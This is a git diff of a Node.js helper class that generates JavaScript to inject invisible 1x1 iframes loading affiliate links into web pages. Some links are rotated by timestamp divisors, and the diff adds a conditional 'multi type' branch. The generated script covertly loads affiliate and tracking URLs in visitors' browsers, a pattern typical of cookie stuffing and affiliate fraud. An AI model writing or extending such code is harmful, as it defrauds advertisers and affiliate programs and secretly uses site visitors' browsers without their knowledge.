@@ -1,8 +1,8 @@
 const fs = require('fs');
 const path = require('path');
 const directory = 'output';
-class generate_helper{
 
+class generate_helper{
   generate_js(advertisor,affiliate,country,callback ){
     var generate = "var a = Math.round(new Date().getTime() / 1000);";
     generate += 'var e = "";';
@@ -32,14 +32,24 @@ class generate_helper{
             generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";                
       
           }else{
-            if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
+            if(advertisor[i].is_divisor_needed == 0 || advertisor[i].type==2)  //Not dividing in numbers or is of multi type
             {
+              if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
+              {
+                generate += "if (f % "+advertisor[i].multi_divisor+" == 0) {";
+              }
+
               for(var j=0; j <affiliate.length;j++)
               {
                 if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
                 {
                   generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                 }
+              }
+
+              if(advertisor[i].is_divisor_needed == 1 && advertisor[i].type==2) //If multi type and need divison
+              {
+                generate += "}";
               }
             }else{  //Dividing afiiliates by divisors
               generate += "var f = Math.floor(Date.now() / 1000);";
@@ -68,9 +78,7 @@ class generate_helper{
                         generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
                       }
                       
-                    }
-                   
-                    
+                    }                    
 
                   k++;
                 }            
@@ -99,7 +107,6 @@ class generate_helper{
           callback(generate);
         }      
     }
-
 
 
 
@@ -160,8 +167,7 @@ class generate_helper{
           }
           generate += "}";  
         }
-      }
-      
+      }      
 
       var iframe_name = "frm"+advertisor[i].country+"_"+advertisor[i].adv_name;
       generate += "$('body').append('<iframe id=\""+iframe_name+"\" style=\"display:none\" marginwidth=\"0\" marginheight=\"0\" hspace=\"0\" frameborder=\"0\" vspace=\"0\" scrolling=\"no\"> </iframe>');    var doc = document.getElementById(\""+iframe_name+"\").contentWindow.document;    doc.open();doc.write(e);doc.close();";
@@ -181,8 +187,6 @@ class generate_helper{
         callback(generate);
       }
   }
-
-
 
 }
 
